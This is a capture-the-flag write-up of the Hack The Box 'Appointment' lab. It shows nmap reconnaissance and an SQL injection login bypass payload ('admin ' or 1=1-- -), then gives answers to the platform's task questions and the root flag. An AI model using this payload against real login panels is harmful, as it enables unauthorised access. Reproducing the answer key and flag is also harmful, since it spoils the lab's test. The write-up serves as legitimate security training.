---
layout: single
title: Appointment - Hack The Box
excerpt: "In this machine, we are exploiting an SQL Injection in the login panel."
date: 2025-03-10
classes: wide
header:
  teaser: /img2/appointment.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Very Easy
tags:
  - SQL Injection
---


![](/img2/Pasted%20image%2020250310105353.png)

## Introduction

> In this machine, we are exploiting an SQL Injection in the login panel.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.242.134
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.242.134
```

![](/img2/Pasted%20image%2020250310105700.png)

## Exploitation

![](/img2/Pasted%20image%2020250310105830.png)

Password --> admin ' or 1=1-- -

SQL query example:

```sql
select flag from users
where user=='admin' and password=='admin' or 1=1-- -'
```

## Tasks

1. What does the acronym SQL stand for?
> Structured Query Language

2. What is one of the most common type of SQL vulnerabilities?
> sql injection

3. What is the 2021 OWASP Top 10 classification for this vulnerability?
> A03:2021-Injection

4. What does Nmap report as the service and version that are running on port 80 of the target?
> Apache httpd 2.4.38 ((Debian))

5. What is the standard port used for the HTTPS protocol?
> 443 

6. What is a folder called in web-application terminology?
> directory

7. What is the HTTP response code is given for 'Not Found' errors?
> 404

8. Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
> dir

9. What single character can be used to comment out the rest of a line in MySQL?
> #

10. If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
> congratulations

11. Submit root flag
> e3d0796d002a446c0e622226f42e9672

![](/img2/Pasted%20image%2020250310110919.png)
